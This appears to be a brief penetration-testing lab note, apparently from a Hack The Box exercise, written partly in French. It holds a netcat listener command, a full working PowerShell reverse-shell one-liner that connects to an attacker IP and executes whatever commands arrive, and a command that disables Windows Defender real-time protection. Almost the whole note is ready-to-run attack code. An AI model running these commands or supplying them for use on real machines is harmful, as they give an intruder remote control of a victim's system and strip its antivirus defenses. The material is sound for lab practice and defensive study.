# Reverse Shell

Reverse Shell :
https://www.revshells.com/
rdesktop -u htb-student 10.129.164.117

On the server (attack box) : sudo nc -lvnp 443

On the client (target) :

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.67',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Command prompt (clique-droit Run As Adinistrator)
Sur Powershell : Clique-droit : Run as Administrator

Pour désactiver l'AV :
--> Set-MpPreference -DisableRealtimeMonitoring $true

